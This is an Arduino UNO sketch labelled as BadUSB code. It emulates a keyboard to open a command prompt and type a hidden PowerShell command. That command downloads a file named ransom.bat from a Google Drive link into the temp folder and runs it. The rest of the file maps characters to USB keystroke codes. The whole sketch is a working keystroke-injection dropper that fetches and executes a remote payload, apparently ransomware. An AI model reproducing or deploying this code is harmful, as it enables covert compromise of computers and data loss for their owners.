/* BADUSB code by sPkSoft For arduino UNO */

//Modifier Keys
#define LEFT_CTRL 0x01
#define LEFT_SHIFT 0x02
#define LEFT_ALT 0x04
#define LEFT_GUI 0x08
#define RIGHT_CTRL 0x10
#define RIGHT_SHIFT 0x20
#define RIGHT_ALT 0x40
#define RIGHT_GUI 0x80

//Keys
#define KEY_ENTER 0x28
#define KEY_BACKSPEACE 0x2A
#define KEY_TAB 0x2B
#define KEY_CAPSLOCK 0x39

uint8_t buf[8] = {0};  //buffer

void setup() {
    Serial.begin(9600);
    delay(500);
    keyPress(LEFT_GUI, 0x15);  // Windows keys + R
    keyRelease();
    delay(200);
    keyString("cmd.exe");
    delay(500);
    keyPress(0, KEY_ENTER);
    keyRelease();
    delay(500);
    keyString("powershell -NoP -NonI -W Hidden -Exec Bypass \"IEX (New-Object System.Net.WebClient).DownloadFile('https://drive.google.com/uc?export=download&id=1L-u32pMh-q4LBTj2D5m7boKLosfrR1Oy', \\\"$env:temp\\ransom.bat\\\"); Start-Process \"$env:temp\\ransom.bat\"\"");
    keyPress(0, KEY_ENTER);
    keyRelease();
}

void loop() {
}

void keyRelease() {
    buf[0] = 0;
    buf[2] = 0;
    Serial.write(buf, 8);  // Release key
}

void keyPress(int mod, int key) {
    buf[0] = mod;
    buf[2] = key;
    Serial.write(buf, 8);
}

void keyString(String text) {
    char alpha[] = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};
    int alpha_dic[] = {4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29};

    char normal_sym[] = {'1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '[', ']', '\\', ';', '`', '\'', ',', '.', '/', ' '};
    int normal_sym_dic[] = {30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 45, 46, 47, 48, 49, 51, 53, 52, 54, 55, 56, 44};

    char shift_sym[] = {'!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+', '{', '}', '|', ':', '~', '\"', '<', '>', '?'};
    int shift_sym_dic[] = {30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 45, 46, 47, 48, 49, 51, 53, 52, 54, 55, 56};

    char temp_char;

    for (int i = 0; i < text.length(); i++) {
        temp_char = text.charAt(i);
        if ((int)temp_char >= 97 && (int)temp_char <=122) {
            for (int j = 0; j < sizeof(alpha_dic); j++) {
                if ((int)temp_char == alpha[j]) {
                    keyPress(0, alpha_dic[j]);
                    keyRelease();
                    break;
                }
            }
        }
        else if ((int)temp_char >= 65 && (int)temp_char <= 90) {
            for (int j = 0; j < sizeof(alpha_dic); j++) {
                if ((int)temp_char == toupper(alpha[j])) {
                    keyPress(RIGHT_SHIFT, alpha_dic[j]);
                    keyRelease();
                    break;
                }
            }
        }
        //non-shift characters
        else if ((int)temp_char == 32 || (int)temp_char == 39 || ((int)temp_char >= 44 && (int)temp_char <= 57) || (int)temp_char == 59 || (int)temp_char == 61 || ((int)temp_char >= 91 && (int)temp_char <= 93) || (int)temp_char == 96) {
            for (int j = 0; j < sizeof(normal_sym); j++) {
                if ((int)temp_char == normal_sym[j]) {
                    keyPress(0, normal_sym_dic[j]);
                    keyRelease();
                    break;
                }
            }
        }
        else if (((int)temp_char >= 33 && (int)temp_char <= 38) || ((int)temp_char >= 40 && (int)temp_char <= 43) || (int)temp_char == 58 || (int)temp_char == 60 || ((int)temp_char >= 62 && (int)temp_char <= 64) || (int)temp_char == 94 || (int)temp_char == 95 || ((int)temp_char >= 123 && (int)temp_char <= 126)) {
            for (int j = 0; j < sizeof(shift_sym); j++) {
                if ((int)temp_char == shift_sym[j]) {
                    keyPress(RIGHT_SHIFT, shift_sym_dic[j]);
                    keyRelease();
                    break;
                }
            }
        }

    }
}
